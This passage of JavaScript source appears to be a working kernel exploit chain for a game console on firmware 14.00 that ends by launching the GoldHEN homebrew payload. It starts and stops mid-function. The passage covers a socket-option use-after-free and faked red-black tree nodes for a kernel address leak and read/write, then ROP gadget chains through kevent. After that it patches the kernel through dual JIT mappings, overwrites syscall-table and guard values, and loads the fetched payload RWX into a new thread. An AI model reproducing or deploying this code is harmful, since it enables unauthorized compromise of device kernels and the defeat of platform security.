    state.fake = fake;
    state.fakePage = page;
    result.lowMapMapped = true;
    const lowMapLease = p.leaseMappedLowRange(
      page.lo >>> 0,
      HX1400_GOLDHEN_DUALMAP_PAGE_BYTES,
    );
    state.lowMapLease = lowMapLease;
    if (
      !lowMapLease ||
      lowMapLease.base !== (page.lo >>> 0) ||
      lowMapLease.length !== HX1400_GOLDHEN_DUALMAP_PAGE_BYTES ||
      lowMapLease.active !== true ||
      typeof lowMapLease.revoke !== "function"
    )
      fail("LOWMAP_LEASE_INVALID");
    result.lowMapLeaseAcquired = true;
    gStack = add64(fake, 4096);
    gCtx = add64(gStack, 1792);
    gMark = add64(gStack, 1664);
    gResult = add64(gStack, 1536);
    if ((gStack.lo & 0xffff) !== 0xa800) fail("BRIDGE_STACK_ENCODING", toHex(gStack));
    zeroMemory(page, HX1400_GOLDHEN_DUALMAP_PAGE_BYTES);
    if ((sc(HX1400_SYSCALLS.setsockopt, state.anchor, 0, 12, bufferAddress(optionSource), 8).i32 | 0) !== 0 || (sc(HX1400_SYSCALLS.setsockopt, state.anchor, 0, 12, bufferAddress(optionGroup), 8).i32 | 0) !== 0) fail("ANCHOR_JOIN");
    if ((sc(HX1400_SYSCALLS.setsockopt, state.targetFd, 41, 51, 0, 0).i32 | 0) !== 0) fail("TARGET_FREE");
    state.targetFreed = true;
    for (const fd of state.victims) {
      if ((sc(HX1400_SYSCALLS.setsockopt, fd, 0, 12, bufferAddress(optionSource), 8).i32 | 0) !== 0 || (sc(HX1400_SYSCALLS.setsockopt, fd, 0, 12, bufferAddress(optionGroup), 8).i32 | 0) !== 0) fail("VICTIM_JOIN", fd);
    }
    write1(add64(fake, 16), 0xef); write1(add64(fake, 17), 0xff); write1(add64(fake, 18), 0xff); write1(add64(fake, 19), 0xf9);
    write8(add64(fake, 24), add64(fake, 512)); write4(add64(fake, 640), 8);
    write8(add64(fake, 32), add64(fake, 768)); write8(add64(fake, 800), add64(fake, 1024));
    write8(add64(fake, 1880), add64(fake, 2048)); write8(add64(fake, 2056), add64(fake, 2304));
    write4(add64(fake, 56), 2); write8(add64(fake, 80), ZERO); write8(add64(fake, 88), ZERO);
    write2(add64(fake, 180), 2); write2(add64(fake, 190), 2);
    state.armed = true;
    state.exploitAuthorityEstablished = true;
    copyBuffer(eventBuffer, buildKevent(heldFd, -18, 1, 0));
    if ((sc(HX1400_SYSCALLS.kevent, state.exploitKq, bufferAddress(eventBuffer), 1, 0, 0, 0).i32 | 0) !== 0) fail("LEAK_EV_ADD");
    let writeVictim = -1;
    let leaked = null;
    let searchOutcome = "exhausted";
    let lastSetsockoptError = null;
    for (const fd of state.victims) {
      rv = sc(HX1400_SYSCALLS.setsockopt, fd, 0, 72, bufferAddress(optionBlock), 12);
      const rc = rv.i32 | 0;
      const tree = read8(add64(fake, 80));
      const ref = read4(add64(fake, 56));
      const count = read8(add64(fake, 88));
      result.kvaSearchAttempts++;
      result.kvaSearchFd = fd;
      result.kvaSearchRc = rc;
      result.kvaSearchRef = ref;
      result.kvaSearchTreeAccepted = isHx1400Current(tree);
      if (rc !== 0) {
        lastSetsockoptError = Object.freeze({
          fd,
          rc,
          ref,
        });
      }
      if (ref !== 2) {
        searchOutcome = "ref-mutated";
        break;
      }
      if (isHx1400Current(tree)) {
        writeVictim = fd;
        leaked = tree;
        searchOutcome = "accepted";
        break;
      }
      if (!same64(tree, ZERO)) {
        searchOutcome = "rejected-tree";
        break;
      }
    }
    if (searchOutcome === "exhausted" && lastSetsockoptError !== null) {
      searchOutcome = "setsockopt-error";
      result.kvaSearchFd = lastSetsockoptError.fd;
      result.kvaSearchRc = lastSetsockoptError.rc;
      result.kvaSearchRef = lastSetsockoptError.ref;
      result.kvaSearchTreeAccepted = false;
    }
    result.kvaSearchOutcome = searchOutcome;
    if (searchOutcome !== "accepted") {
      const code = {
        exhausted: "NO_KVA_EXHAUSTED",
        "ref-mutated": "NO_KVA_REF_MUTATED",
        "rejected-tree": "NO_KVA_REJECTED_TREE",
        "setsockopt-error": "NO_KVA_SETSOCKOPT",
      }[searchOutcome];
      fail(code, `attempts=${result.kvaSearchAttempts} fd=${result.kvaSearchFd} rc=${result.kvaSearchRc}`);
    }
    if (writeVictim < 0 || !isHx1400Current(leaked)) fail("NO_KVA_REJECTED_TREE");

    const n75 = add64(fake, 2560), n76 = add64(fake, 2688), n77 = add64(fake, 2816);
    copyTo(n75, buildRbNode(n76, ZERO, ZERO, 0, -1));
    copyTo(n76, buildRbNode(ZERO, n77, n75, 1, -2));
    copyTo(n77, buildRbNode(ZERO, ZERO, n76, 0, -3));
    write8(add64(fake, 80), n75); write8(add64(fake, 88), { lo: 3, hi: 0 });
    new Uint8Array(optionBlock)[7] = 2;
    rv = sc(HX1400_SYSCALLS.setsockopt, writeVictim, 0, 72, bufferAddress(optionBlock), 12);
    const gadgetOk = (rv.i32 | 0) === 0 && same64(read8(add64(n77, 16)), n75) && same64(read8(add64(fake, 80)), n76) && isHx1400Current(read8(n76));
    if (!gadgetOk) fail("RB_GADGET");

    const slot = ka(HX1400_P[13]);
    const ops = ka(HX1400_P[14]);
    const address2 = add64(fake, 2304), fakeOps = add64(fake, 3072), address3 = add64(fake, 3328);
    copyTo(address2, buildRbNode(fakeOps, address3, sub64(slot, 8), 0, -1));
    copyTo(fakeOps, buildRbNode(ZERO, ZERO, address2, 1, -2));
    copyTo(address3, buildRbNode(ZERO, ZERO, ZERO, 0, -3));
    write8(add64(fake, 80), address2); write8(add64(fake, 88), { lo: 3, hi: 0 });
    new Uint8Array(optionBlock)[7] = 3;
    state.fakeOps = fakeOps;
    state.slotAddress = slot;
    state.slotMutationAttempted = true;
    result.rotationAttempted = true;
    let rotationFailure = null;
    let rotationError = null;
    let rotationRc = null;
    try {
      rv = sc(HX1400_SYSCALLS.setsockopt, writeVictim, 0, 72, bufferAddress(optionBlock), 12);
      rotationRc = rv.i32 | 0;
    } catch (error) {
      rotationFailure = error;
      rotationError = "invocation";
    }
    let snapshotFailure = null;
    const captureRotation = (address) => {
      try {
        return read8(address);
      } catch (error) {
        if (snapshotFailure === null) snapshotFailure = error;
        return null;
      }
    };
    const rotationRoot = captureRotation(add64(fake, 80));
    const rotationCount = captureRotation(add64(fake, 88));
    const address2Left = captureRotation(address2);
    const address2Right = captureRotation(add64(address2, 8));
    const address2Parent = captureRotation(add64(address2, 16));
    const fakeOpsLeft = captureRotation(fakeOps);
    const fakeOpsRight = captureRotation(add64(fakeOps, 8));
    const fakeOpsParent = captureRotation(add64(fakeOps, 16));
    const address3Left = captureRotation(address3);
    const address3Right = captureRotation(add64(address3, 8));
    const address3Parent = captureRotation(add64(address3, 16));
    if (snapshotFailure !== null) {
      rotationError =
        rotationError === "invocation"
          ? "invocation-and-snapshot"
          : "snapshot";
      if (rotationFailure === null) rotationFailure = snapshotFailure;
    }
    result.rotationError = rotationError;
    result.rotationRc = rotationRc;
    result.rotationExpectedOpsMatch =
      fakeOpsLeft !== null && same64(fakeOpsLeft, ops);
    state.slotOriginal = fakeOpsLeft;
    state.slotOriginalVerified =
      fakeOpsLeft !== null && isHx1400Current(fakeOpsLeft);
    if (rotationError !== null) {
      result.rotationPredicateMask = null;
      throw rotationFailure;
    }
    let rotationMask = 0;
    if (rotationRc === 0) rotationMask |= 1 << 0;
    if (same64(rotationRoot, address2)) rotationMask |= 1 << 1;
    if (same64(rotationCount, { lo: 4, hi: 0 })) rotationMask |= 1 << 2;
    if (same64(address2Left, ZERO)) rotationMask |= 1 << 3;
    if (same64(address2Right, address3)) rotationMask |= 1 << 4;
    if (same64(address2Parent, fakeOps)) rotationMask |= 1 << 5;
    if (isHx1400Current(fakeOpsLeft)) rotationMask |= 1 << 6;
    if (same64(fakeOpsRight, address2)) rotationMask |= 1 << 7;
    if (same64(address3Parent, ZERO)) rotationMask |= 1 << 8;
    if (result.rotationExpectedOpsMatch) rotationMask |= 1 << 9;
    result.rotationPredicateMask = rotationMask >>> 0;
    state.slotRotated = (rotationMask & 0x1ff) === 0x1ff;
    const rotateOk = state.slotRotated && state.slotOriginalVerified;
    if (!rotateOk) fail("ROTATION_GATE");
    write8(fakeOps, ZERO); write8(add64(fakeOps, 8), gadget(15)); write8(add64(fakeOps, 16), gadget(15));
    write8(add64(fakeOps, 24), gadget(15)); write8(add64(fakeOps, 32), gadget(16));
    if (!same64(read8(add64(fakeOps, 8)), gadget(15)) || !same64(read8(add64(fakeOps, 32)), gadget(16))) fail("FAKE_OPS_READBACK");

    write8(gStack, ZERO);
    write8(gCtx, ZERO);
    write8(gMark, ZERO);
    write8(gResult, ZERO);
    state.bridgeKq = ownFd(sc(HX1400_SYSCALLS.kqueue).i32 | 0);
    if (state.bridgeKq < 0) fail("BRIDGE_KQUEUE");
    copyBuffer(eventBuffer, buildKevent(HX1400_SOURCE_PINS.ident, -23, 1));
    if ((sc(HX1400_SYSCALLS.kevent, state.bridgeKq, bufferAddress(eventBuffer), 1, 0, 0, 0).i32 | 0) !== 0) fail("BRIDGE_EV_ADD");
    kb0(); const bridgeCount = kb1();
    if (!bridgeGo(bridgeCount)) fail("BRIDGE_PROBE");

    const challengeAddress = ka(HX1400_SOURCE_PINS.challengeRva);
    const originalChallenge = kernelRead(challengeAddress);
    state.challengeAddress = challengeAddress;
    state.challengeOriginal = originalChallenge;
    const challengeWord = deriveChallengeWord(originalChallenge, context.claim.challenge_hex);
    result.challengeWriteAttempted = true;
    state.challengeMayBeDirty = true;
    let proofError = null;
    try {
      kernelWrite(challengeAddress, challengeWord);
      result.challengeWritten = same64(kernelRead(challengeAddress), challengeWord);
      if (!result.challengeWritten) fail("CHALLENGE_WRITE_READBACK");
    } catch (error) {
      proofError = error;
    }
    if (!restoreChallenge() && proofError === null) proofError = new HxFailure("CHALLENGE_RESTORE_READBACK");
    if (proofError !== null) {
      result.rebootRequired = true;
      throw proofError;
    }
    result.kernelRwProved = true;
    asserted("HX_REVERSIBLE_KRW", true, toHex(challengeAddress));

    const oracleChallenge = deriveHx1400GoldhenDualmapChallenge(
      context.claim.challenge_hex,
    );
    const oracleSecondChallenge = Object.freeze({
      lo: (oracleChallenge.lo ^ 0xa5c31f7d) >>> 0,
      hi: (oracleChallenge.hi ^ 0x6e91d24b) >>> 0,
    });
    const exactFrozenRequest = (request, names) =>
      request !== null &&
      typeof request === "object" &&
      Object.getPrototypeOf(request) === Object.prototype &&
      Object.isFrozen(request) &&
      exactKeys(request, names);
    const exactAcknowledgement = (acknowledgement) =>
      acknowledgement !== null &&
      typeof acknowledgement === "object" &&
      Object.getPrototypeOf(acknowledgement) === null &&
      Object.isFrozen(acknowledgement) &&
      Reflect.ownKeys(acknowledgement).length === 0;
    const syncOracleFields = () => {
      result.oracleExecutions = state.oracleRoundsCompleted;
      result.oracleSignatureVerified =
        state.oracleSignatureChecks === 4 && state.oracleRoundsCompleted === 2;
      result.oracleRopReadOnly =
        state.oracleRoundsStarted > 0 &&
        state.oracleRoundsStarted === state.oracleRoundsCompleted;
      result.oracleAuthorityConsumed = state.oracleAuthorityConsumed;
      result.oracleSignatureChecks = state.oracleSignatureChecks;
      result.oracleRoundsStarted = state.oracleRoundsStarted;
      result.oracleRoundsCompleted = state.oracleRoundsCompleted;
    };
    const setOraclePhase = (phase) => {
      const previous = HX1400_GOLDHEN_DUALMAP_DIAGNOSTIC_PHASES.indexOf(result.oracleDiagnosticPhase);
      const next = HX1400_GOLDHEN_DUALMAP_DIAGNOSTIC_PHASES.indexOf(phase);
      if (next < previous || next < 0) throw new Error("oracle diagnostic phase regression");
      result.oracleDiagnosticPhase = phase;
    };
    const latchOracleReason = (reason) => {
      if (result.oracleDiagnosticReason === "none") result.oracleDiagnosticReason = reason;
    };
    let resolvedGadgetRva = null;
    const readGadgetSnapshot = (rva) => {
      const address = ka(rva);
      try {
        return {
          qword0: kernelRead(address),
          qword8: kernelRead(add64(address, 8)),
        };
      } catch (error) {
        latchOracleReason("signature-read");
        throw error;
      }
    };
    const readGadgetSignature = () => {
      if (resolvedGadgetRva === null) return false;
      const snapshot = readGadgetSnapshot(resolvedGadgetRva);
      const matched = matchesHx1400GoldhenDualmapGsGadgetSignature(
        snapshot.qword0,
        snapshot.qword8,
      );
      if (matched) state.oracleSignatureChecks++;
      syncOracleFields();
      return matched;
    };

    const kernelExecutor = Object.freeze({
      protocol: HX1400_GOLDHEN_DUALMAP_OWNER_PROTOCOL,
      synchronous: true,
      currentThreadGs: true,
      readOnly: true,
      source13Sha256: HX1400_GOLDHEN_DUALMAP_SOURCE13_SHA256,
      source13GadgetRva: HX1400_GOLDHEN_DUALMAP_GS_SOURCE13_RVA,
      candidateRvas: HX1400_GOLDHEN_DUALMAP_GS_CANDIDATE_RVAS,
      gadgetBytes: HX1400_GOLDHEN_DUALMAP_GS_GADGET_BYTES,
      uniqueExactRuntimeResolution: true,
      signatureCheckedBeforeAndAfter: true,
      executeCurrentThread(request) {
        const expectedRound = state.oracleRoundsCompleted + 1;
        const expectedChallenge = expectedRound === 1
          ? oracleChallenge
          : expectedRound === 2
            ? oracleSecondChallenge
            : null;
        if (
          expectedChallenge === null ||
          !exactFrozenRequest(
            request,
            ["protocol", "round", "challenge", "acknowledgement", "capture"],
          ) ||
          request.protocol !== HX1400_GOLDHEN_DUALMAP_OWNER_PROTOCOL ||
          request.round !== expectedRound ||
          !same64(request.challenge, expectedChallenge) ||
          !exactAcknowledgement(request.acknowledgement) ||
          typeof request.capture !== "function"
        ) {
          latchOracleReason("request-validation");
          throw new Error("invalid GoldHEN owner request");
        }
        const prefix = `round-${expectedRound}`;
        setOraclePhase(`${prefix}-request-validated`);
        if (resolvedGadgetRva === null) {
          resolvedGadgetRva = resolveHx1400GoldhenDualmapGsGadgetRva(
            readGadgetSnapshot,
          );
        }
        if (resolvedGadgetRva === null) {
          latchOracleReason("signature-mismatch");
          throw new Error("current-owner gadget did not resolve uniquely");
        }
        if (!readGadgetSignature()) {
          latchOracleReason("signature-mismatch");
          throw new Error("current-owner gadget signature mismatch before ROP");
        }
        setOraclePhase(`${prefix}-signature-before-ok`);
        let currentThread;
        try {
          write8(gResult, ZERO);
          kb0();
          push(ka(resolvedGadgetRva));
          push(ZERO);
          push(gadget(23));
          push(gResult);
          push(gadget(29));
          push(ZERO);
          const count = kb1();
          setOraclePhase(`${prefix}-chain-built`);
          state.oracleRoundsStarted++;
          syncOracleFields();
          if (!bridgeGo(count)) {
            latchOracleReason("bridge-failed");
            throw new Error("current-owner ROP bridge failed");
          }
          currentThread = read8(gResult);
          setOraclePhase(`${prefix}-bridge-returned`);
        } catch (error) {
          if (result.oracleDiagnosticReason === "none") latchOracleReason("chain-build");
          throw error;
        }
        if (!readGadgetSignature()) {
          latchOracleReason("signature-mismatch");
          throw new Error("current-owner gadget signature mismatch after ROP");
        }
        setOraclePhase(`${prefix}-signature-after-ok`);
        try {
          request.capture(currentThread);
        } catch (error) {
          latchOracleReason("capture");
          throw error;
        }
        state.oracleRoundsCompleted++;
        state.oracleExecuteRound = state.oracleRoundsCompleted;
        setOraclePhase(`${prefix}-complete`);
        syncOracleFields();
        return request.acknowledgement;
      },
    });
    state.oracleResources.push(kernelExecutor);
    result.oracleAttempted = true;
    setOraclePhase("oracle-entered");
    const oracleResult = runHx1400GoldhenDualmapOwnerOracle(Object.freeze({
      firmware: "14.00",
      mode: "read-only",
      challenge: oracleChallenge,
      kernelExecutor,
      kernelBase: state.kbase,
      read64(address) { return kernelRead(address); },
      read32(address) { return kernelRead(address).lo >>> 0; },
      readBytes(address, length) { return kernelReadBytes(address, length); },
      getpid() { return pointerResult(sc(HX1400_SYSCALLS.getpid)).lo >>> 0; },
    }));
    result.oracleCode = oracleResult.code;
    result.oracleKernelMutated = oracleResult.kernelMutated;
    result.oracleCleanup = oracleResult.cleanup;
    result.oracleRebootRequired = oracleResult.rebootRequired;
    syncOracleFields();
    result.currentObjectsAuthenticated =
      oracleResult.ok === true &&
      oracleResult.code === "OK_CURRENT_OWNER" &&
      oracleResult.stableRounds === 2 &&
      oracleResult.pointerFree === true;
    result.handlerSemanticAttested = result.currentObjectsAuthenticated;
    result.mmapCapabilityRecheckAttested =
      result.currentObjectsAuthenticated &&
      oracleResult.mmapCapabilityRecheckAttested === true;
    result.dwordGadgetAttested = result.currentObjectsAuthenticated;
    if (
      !result.currentObjectsAuthenticated ||
      oracleResult.kernelMutated !== false ||
      oracleResult.cleanup !== true ||
      oracleResult.rebootRequired !== false ||
      !result.mmapCapabilityRecheckAttested ||
      result.oracleExecutions !== 2 ||
      !result.oracleSignatureVerified ||
      !result.oracleRopReadOnly
    ) {
      fail(
        result.oracleDiagnosticReason === "signature-mismatch"
          ? "ERR_GADGET_SIGNATURE"
          : (oracleResult.code || "GOLDHEN_ORACLE_FAILED"),
      );
    }

    for (let index = 0; index < HX1400_GUARD_RVAS.length; index += 1) {
      const observed = kernelScalar(ka(HX1400_GUARD_RVAS[index]), HX1400_GUARD_WIDTHS[index]);
      if (observed !== (HX1400_GUARD_STOCK[index] >>> 0))
        fail("STOCK_GUARD_MISMATCH", `${index}:${observed.toString(16)}`);
      result.stockGuardsVerified += 1;
    }

    result.writerIsolationVerified =
      result.aioCleanupVerified &&
      !state.bridgeCallActive &&
      !state.credentialWriterActive &&
      state.credentialWriterGeneration === 0 &&
      !state.quarantine;
    if (!result.writerIsolationVerified) fail("ERR_WRITER_ISOLATION");
    state.credentialWriterGeneration += 1;
    state.credentialWriterActive = true;
    let lease;
    try {
      const mmapView = (address, length, protection, flags, fd, offset) => pointerResult(
        sc(
          HX1400_SYSCALLS.mmap,
          address === null ? 0 : q(address),
          length,
          protection,
          flags,
          fd,
          offset,
        ),
      );
      lease = consumeHx1400GoldhenDualmapOwnerLease(oracleResult, Object.freeze({
        aioCleanupVerified: result.aioCleanupVerified,
        bridgeCallActive: state.bridgeCallActive,
        exclusiveGeneration:
          state.credentialWriterActive &&
          state.credentialWriterGeneration === 1,
        otherCredentialWriter: false,
        read32(address) { return kernelRead(address).lo >>> 0; },
        write32(address, value) { return writeKernelDwordRop(address, value); },
        createWritableView(registerDescriptor) {
          const created = sc(
            HX1400_SYSCALLS.jitshmCreate,
            0,
            HX1400_GOLDHEN_DUALMAP_JIT_BYTES,
            7,
            0,
          ).i32 | 0;
          if (created < 0) return created;
          registerDescriptor(created);
          state.jitFd = ownFd(created);
          result.jitDescriptorCreated = true;
          const mapping = acquireHx1400GoldhenDualmapWritableView(
            created,
            mmapView,
            (retained) => {
              state.jitRwMap = retained;
              result.jitWritableMappingCreated = true;
            },
          );
          if (mapping === null) throw new Error("writable JIT mmap failed");
          return created;
        },
        mapExecutableView(fd) {
          if (fd !== state.jitFd || state.jitRwMap === null) return -1;
          const mapping = acquireHx1400GoldhenDualmapExecutableView(
            fd,
            mmapView,
            (retained) => {
              state.jitRxMap = retained;
              result.jitExecutableMappingCreated = true;
            },
          );
          if (mapping === null) return -1;
          if (!validateHx1400GoldhenDualmapNonoverlap(state.jitRwMap, mapping))
            return -1;
          return 0;
        },
        disposeJit(fd) {
          const hadMappings =
            state.jitRwMap !== null || state.jitRxMap !== null;
          const hadDescriptor = Number.isInteger(fd) && fd >= 0 && state.jitFd === fd;
          const cleaned = cleanupHx1400GoldhenDualmapJitViews(
            state.jitRwMap,
            state.jitRxMap,
            fd,
            (mapping, length) =>
              (sc(HX1400_SYSCALLS.munmap, q(mapping), length).i32 | 0) === 0,
            (ownedFd) => closeFd(ownedFd),
          );
          state.jitRwMap = cleaned.writable;
          state.jitRxMap = cleaned.executable;
          state.jitFd = cleaned.fd;
          if (cleaned.ok) {
            result.jitMappingsReleased = hadMappings;
            result.jitDescriptorReleased = hadDescriptor;
          }
          return cleaned.ok ? 0 : -1;
        },
      }));
    } finally {
      state.credentialWriterActive = false;
    }
    result.leaseStatus = lease.status || "REFUSED";
    result.leaseWrites = Number.isInteger(lease.writes) ? lease.writes : 0;
    result.leaseCreateCalls = Number.isInteger(lease.createCalls) ? lease.createCalls : 0;
    result.leaseMapCalls = Number.isInteger(lease.mapCalls) ? lease.mapCalls : 0;
    result.leaseWriteArmConfirmed = lease.writeArmConfirmed === true;
    result.leaseWriteRestoreConfirmed = lease.writeRestoreConfirmed === true;
    result.leaseExecuteArmConfirmed = lease.executeArmConfirmed === true;
    result.leaseExecuteRestoreConfirmed = lease.executeRestoreConfirmed === true;
    result.leaseBorrowedBitsCleared = lease.borrowedBitsCleared === true;
    result.leaseTerminalMatchesOriginal = lease.terminalMatchesOriginal === true;
    result.ownerRevalidated = lease.ownerRevalidated === true;
    state.oracleAuthorityConsumed = true;
    result.oracleAuthorityConsumed = true;
    setOraclePhase("authority-consumed");
    syncOracleFields();
    if (
      !lease.ok ||
      lease.pointerFree !== true ||
      lease.fd !== state.jitFd ||
      lease.writes !== 4 ||
      lease.createCalls !== 1 ||
      lease.mapCalls !== 1 ||
      !lease.writeArmConfirmed ||
      !lease.writeRestoreConfirmed ||
      !lease.executeArmConfirmed ||
      !lease.executeRestoreConfirmed ||
      !lease.borrowedBitsCleared ||
      !lease.terminalMatchesOriginal ||
      !lease.ownerRevalidated
    ) {
      if (lease.quarantined) enterQuarantine(`lease:${lease.error || lease.status}`);
      fail(lease.error || "JIT_LEASE_FAILED");
    }
    result.jitMappingsCapabilityBound =
      result.jitWritableMappingCreated &&
      result.jitExecutableMappingCreated;
    result.wxPatchMappingVerified =
      result.jitMappingsCapabilityBound &&
      validateHx1400GoldhenDualmapNonoverlap(state.jitRwMap, state.jitRxMap);
    if (!result.wxPatchMappingVerified) fail("JIT_MMAP");
    setOraclePhase("oracle-complete");

    zeroMemory(state.jitRwMap, HX1400_GOLDHEN_DUALMAP_JIT_BYTES);
    copyTo(add64(state.jitRwMap, HX1400_GOLDHEN_DUALMAP_PATCH_OFFSET), patchBytes);
    result.patchCopyVerified = verifyBytes(
      add64(state.jitRxMap, HX1400_GOLDHEN_DUALMAP_PATCH_OFFSET),
      patchBytes,
    );
    result.crossViewPatchVerified = result.patchCopyVerified;
    if (!result.crossViewPatchVerified) fail("PATCH_COPY_READBACK");

    result.patchExecutionAttempted = true;
    state.patchExecutionAmbiguous = true;
    let patchRc = -1;
    try {
      write8(add64(state.fakeOps, 32), state.jitRxMap);
      copyBuffer(state.eventBuffer, buildKevent(HX1400_SOURCE_PINS.ident, -23, 1));
      patchRc = sc(
        HX1400_SYSCALLS.kevent,
        state.bridgeKq,
        bufferAddress(state.eventBuffer),
        1,
        0,
        0,
        0,
      ).i32 | 0;
    } finally {
      write8(add64(state.fakeOps, 32), gadget(16));
      result.bridgeCallbackRestored =
        same64(read8(add64(state.fakeOps, 32)), gadget(16));
    }
    if (patchRc !== 0 || !result.bridgeCallbackRestored) {
      enterQuarantine(`patch-dispatch rc=${patchRc}`);
      fail("PATCH_DISPATCH");
    }
    state.patchExecutionAmbiguous = false;
    const sysent11 = kernelRead(ka(HX1400_P[0]));
    result.sysent11Restored =
      same64(sysent11, ka(HX1400_P[1])) &&
      kernelScalar(ka(HX1400_SOURCE_PINS.sysentNargRva), 4) === 2;
    if (!result.sysent11Restored) {
      enterQuarantine("sysent11 readback");
      fail("SYSENT11_READBACK");
    }
    for (let index = 0; index < HX1400_GUARD_RVAS.length; index += 1) {
      const observed = kernelScalar(ka(HX1400_GUARD_RVAS[index]), HX1400_GUARD_WIDTHS[index]);
      if (observed !== (HX1400_GUARD_PATCHED[index] >>> 0)) {
        enterQuarantine(`patched guard ${index}`);
        fail("PATCH_GUARD_READBACK", index);
      }
      result.patchedGuardsVerified += 1;
    }

    const releasedJit = cleanupHx1400GoldhenDualmapJitViews(
      state.jitRwMap,
      state.jitRxMap,
      state.jitFd,
      (mapping, length) =>
        (sc(HX1400_SYSCALLS.munmap, q(mapping), length).i32 | 0) === 0,
      (fd) => closeFd(fd),
    );
    state.jitRwMap = releasedJit.writable;
    state.jitRxMap = releasedJit.executable;
    state.jitFd = releasedJit.fd;
    result.jitMappingsReleased =
      releasedJit.ok && state.jitRwMap === null && state.jitRxMap === null;
    result.jitDescriptorReleased = releasedJit.ok && state.jitFd === -1;
    if (!result.jitMappingsReleased || !result.jitDescriptorReleased) {
      enterQuarantine(releasedJit.reason);
      fail("JIT_RELEASE");
    }

    const down = safeDown();
    let descriptors = false;
    let lowMapReleased =
      state.fakePage === null && state.lowMapLease === null;
    if (!state.quarantine && down.slot && down.bridge) {
      descriptors = cleanupDescriptors(true);
      if (descriptors) {
        lowMapReleased = releaseLowMap();
        if (!lowMapReleased) enterQuarantine("low mapped page cleanup failed");
      } else {
        enterQuarantine("descriptor cleanup failed after patch");
      }
    }
    const affinity = restoreAffinity();
    result.quarantined = state.quarantine;
    result.stageCleanupVerified =
      !state.quarantine &&
      down.slot &&
      down.bridge &&
      descriptors &&
      affinity &&
      lowMapReleased &&
      result.aioCleanupVerified &&
      !state.challengeMayBeDirty &&
      result.jitMappingsReleased &&
      result.jitDescriptorReleased;
    state.exploitRetired = deriveHx1400GoldhenDualmapExploitRetired(
      result.stageCleanupVerified,
      state.exploitAuthorityEstablished,
    );
    result.exploitRetired = state.exploitRetired;
    if (!result.stageCleanupVerified) fail("STAGE_CLEANUP_UNVERIFIED");
    if (!result.exploitRetired) fail("EXPLOIT_NOT_RETIRED");

    hen = await context.fetchHen();
    if (!(hen instanceof Uint8Array) || hen.length !== HX1400_GOLDHEN_DUALMAP_HEN_BYTES)
      fail("HEN_SIZE", hen && hen.length);
    const henDigest = digestHex(await context.sha256(hen));
    if (henDigest !== HX1400_GOLDHEN_DUALMAP_HEN_SHA256) fail("HEN_SHA256", henDigest);
    if (
      Array.from(hen.slice(0, 5)).map((value) => value.toString(16).padStart(2, "0")).join("") !== HX1400_GOLDHEN_DUALMAP_HEN_HEAD ||
      (5 + (new DataView(hen.buffer, hen.byteOffset, hen.byteLength).getInt32(1, true))) >>> 0 !== HX1400_GOLDHEN_DUALMAP_HEN_ENTRY
    ) fail("HEN_ENTRY");
    const henMapping = mapHx1400GoldhenDualmapPostpatchHen(
      (address, length, protection, flags, fd, offset) => pointerResult(
        sc(HX1400_SYSCALLS.mmap, address === 0 ? 0 : q(address), length, protection, flags, fd, offset),
      ),
      (retained) => {
        state.henMap = retained;
        result.henRwxMapCreated = true;
      },
    );
    if (henMapping === null) fail("HEN_MMAP");
    zeroMemory(henMapping, HX1400_GOLDHEN_DUALMAP_JIT_BYTES);
    copyTo(add64(henMapping, HX1400_GOLDHEN_DUALMAP_HEN_OFFSET), hen);
    result.henCopyVerified =
      verifyBytes(add64(henMapping, HX1400_GOLDHEN_DUALMAP_HEN_OFFSET), hen);
    result.bssTailVerified =
      verifyZeroRange(henMapping, 0, HX1400_GOLDHEN_DUALMAP_HEN_OFFSET) &&
      verifyZeroRange(
        henMapping,
        HX1400_GOLDHEN_DUALMAP_HEN_OFFSET + hen.length,
        HX1400_GOLDHEN_DUALMAP_JIT_BYTES,
      );
    if (!result.henCopyVerified || !result.bssTailVerified)
      fail("HEN_COPY_READBACK");

    const thread = new ArrayBuffer(8);
    state.buffers.push(thread);
    const pthread = add64(pointerResult(context.libkernelBase), context.off.k_pthread_create);
    result.goldhenLaunchAttempted = true;
    state.launchAmbiguous = true;
    const launch = context.callAddr(
      q(pthread),
      [bufferAddress(thread), 0, q(add64(henMapping, HX1400_GOLDHEN_DUALMAP_HEN_OFFSET)), 0],
    );
    if ((launch.i32 | 0) !== 0) {
      state.launchAmbiguous = false;
      fail("PTHREAD_CREATE", launch.i32 | 0);
    }
    const threadHandle = get64(new DataView(thread), 0);
    if (same64(threadHandle, ZERO)) fail("PTHREAD_HANDLE_ZERO");
    result.goldhenLaunchDispatched = true;
    result.goldhenRuntimeObserved = false;
    state.launchAmbiguous = false;
    result.henMappingRetained = state.henMap !== null;
    result.cleanupVerified = result.stageCleanupVerified;
    result.rebootRequired = true;
    result.ok =
      result.stageCleanupVerified &&
      result.exploitRetired &&
      result.handlerSemanticAttested &&
      result.mmapCapabilityRecheckAttested &&
      result.dwordGadgetAttested &&
      result.ownerRevalidated &&
      result.writerIsolationVerified &&
      result.leaseWrites === 4 &&
      result.leaseCreateCalls === 1 &&
      result.leaseMapCalls === 1 &&
      result.leaseWriteArmConfirmed &&
      result.leaseWriteRestoreConfirmed &&
      result.leaseExecuteArmConfirmed &&
      result.leaseExecuteRestoreConfirmed &&
      result.leaseBorrowedBitsCleared &&
      result.leaseTerminalMatchesOriginal &&
      result.jitMappingsCapabilityBound &&
      result.jitMappingsReleased &&
      result.jitDescriptorReleased &&
      result.wxPatchMappingVerified &&
      result.crossViewPatchVerified &&
      result.patchCopyVerified &&
      result.stockGuardsVerified === 24 &&
      result.patchedGuardsVerified === 24 &&
      result.bridgeCallbackRestored &&
      result.sysent11Restored &&
      result.henRwxMapCreated &&
      result.henCopyVerified &&
      result.bssTailVerified &&
      result.goldhenLaunchDispatched &&
      result.henMappingRetained &&
      !result.goldhenRuntimeObserved;
    result.code = result.ok
      ? "OK_GOLDHEN_DUALMAP_LAUNCH_DISPATCHED_REBOOT_REQUIRED"
      : "STAGE_CLEANUP_UNVERIFIED";
    note("HX-GOLDHEN-DUALMAP-FINAL", `${result.code} launch_dispatched=${result.goldhenLaunchDispatched} runtime_observed=false`);
    return result;
  } catch (error) {
    const code = error instanceof HxFailure ? error.code : "THREW";
    result.code = code;
    note("HX-GOLDHEN-FAIL", `${code}:${error && error.message ? error.message : error}`);
    if (
      state.patchExecutionAmbiguous ||
      state.launchAmbiguous ||
      result.patchExecutionAttempted ||
      result.goldhenLaunchAttempted
    ) enterQuarantine("failure after credential/patch/launch boundary");
    if (!state.quarantine && !result.patchExecutionAttempted) {
      const hadMappings = state.jitRwMap !== null || state.jitRxMap !== null;
      const hadDescriptor = state.jitFd >= 0;
